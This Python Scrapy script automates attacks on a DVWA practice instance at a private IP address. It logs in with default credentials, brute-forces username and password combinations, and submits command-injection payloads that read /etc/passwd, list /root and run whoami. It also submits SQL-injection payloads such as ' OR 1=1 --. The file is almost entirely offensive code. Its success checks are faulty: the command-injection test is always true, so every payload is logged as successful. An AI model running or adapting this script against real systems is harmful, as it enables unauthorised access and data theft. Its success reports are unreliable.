import scrapy
from itertools import product

class DVWASpider(scrapy.Spider):
    name = 'automate'
    allowed_domains = ['192.168.196.128']
    start_urls = ['http://192.168.196.128/DVWA/login.php']
    cmd_payloads = ['127.0.0.1; ls -la /root', '127.0.0.1 ; cat /etc/passwd', '127.0.0.1| cat /etc/passwd', '1; whoami', '1 && whoami', '1 && ls']
    sqli_payloads = ["' OR 1=1 --", "' OR '1'='1' --", "' OR 'x'='x", "' UNION SELECT NULL, NULL, NULL --", "' AND 1=0 --"]
    
    usernames = ['admin', '1337', 'smithy', 'pablo', 'gordonb']  # Replace with your actual wordlist for usernames
    passwords = ['password', 'charley', 'letmein']  # Replace with your actual wordlist for passwords

    def parse(self, response):
        # Check if we are on the login page
        if "Login" in response.text:
            # Fill in the login form
            return scrapy.FormRequest.from_response(
                response,
                formdata={
                    'username': 'admin',  # Replace with your DVWA username
                    'password': 'password'  # Replace with your DVWA password
                },
                callback=self.after_login
            )

    def after_login(self, response):
        # Check if login was successful
        if "Login failed" in response.text:
            self.logger.error("Login failed")
            return
        else:
            self.logger.info("Login successful")
            # Go to the DVWA vulnerabilities page
            yield scrapy.Request(url='http://192.168.196.128/DVWA/index.php', callback=self.parse_vulnerabilities, dont_filter=True)

    def parse_vulnerabilities(self, response):
        # Navigate to the brute force page after successful login
        brute_force_url = 'http://192.168.196.128/DVWA/vulnerabilities/brute/'
        command_injection_url = "http://192.168.196.128/DVWA/vulnerabilities/exec/"
        sql_injection_url = "http://192.168.196.128/DVWA/vulnerabilities/sqli/"

        # Pass cookies to maintain session
        yield scrapy.Request(url=brute_force_url, callback=self.brute_force_attack, dont_filter=True)

        yield scrapy.Request(url=command_injection_url, callback=self.command_injection_attack, dont_filter=True)

        yield scrapy.Request(url=sql_injection_url, callback=self.sql_injection_attack, dont_filter=True)

    def brute_force_attack(self, response):
        # Perform brute force attack by trying username and password combinations
        for username, password in product(self.usernames, self.passwords):
            self.logger.info(f"Trying {username}:{password}")
            # Send GET request with username and password to brute force form
            yield scrapy.FormRequest.from_response(
                response,
                formdata={
                    'username': username,
                    'password': password,
                    'Login': 'Login'
                },
                callback=self.check_login_result,
                meta={'username': username, 'password': password},
                dont_filter=True
            )
    


    def check_login_result(self, response):
    # Check if login was successful
        username = response.meta['username']
        password = response.meta['password']
    
    # Log the full response text for the page
        #self.logger.info(f"Response text for {username}:{password} - {response.text}")

        if "Welcome" in response.text:
            self.logger.info(f"Successful login with {username}:{password}")
        else:
            pass


    def command_injection_attack(self, response):
        for payload in self.cmd_payloads:
            self.logger.info(f"Trying payload: {payload}")
            yield scrapy.FormRequest.from_response(
                response,
                formname='ping',
                formdata={
                    'ip': payload,  # Replace 'ip' with the actual form field name
                    'Submit': 'Submit'
                },
                callback=self.check_injection_result,
                meta={'payload': payload},
                dont_filter=True
            )

    def check_injection_result(self, response):
        payload = response.meta['payload']
        if(payload=='abcd'):
            self.logger.info(f"Payload failed for payload: {payload}")
        elif "root" in response.text or "etc/passwd" or "/usr" in response.text:  # Add any other success indicators
            self.logger.info(f"Successful command injection with payload: {payload}")
        
        else:
            self.logger.info(f"Payload failed: {payload}")


    def sql_injection_attack(self, response):
        # Perform SQL injection attack
        for payload in self.sqli_payloads:
            self.logger.info(f"Trying SQL payload: {payload}")
            yield scrapy.FormRequest.from_response(
                response,
                formdata={
                    'id': payload,  # Replace 'id' with the actual form field name in SQLi page
                    'Submit': 'Submit'
                },
                callback=self.check_sqli_result,
                meta={'payload': payload},
                dont_filter=True
            )

    def check_sqli_result(self, response):
        payload = response.meta['payload']
        # Checking for common SQLi success indicators
        if(payload=='abcd'):
            self.logger.info(f"SQL injection failed for payload: {payload}")
        elif "You have an error in your SQL syntax" in response.text or "ID" in response.text:
            self.logger.info(f"SQL injection successful with payload: {payload}")
        
        else:
            self.logger.info(f"SQL injection failed for payload: {payload}")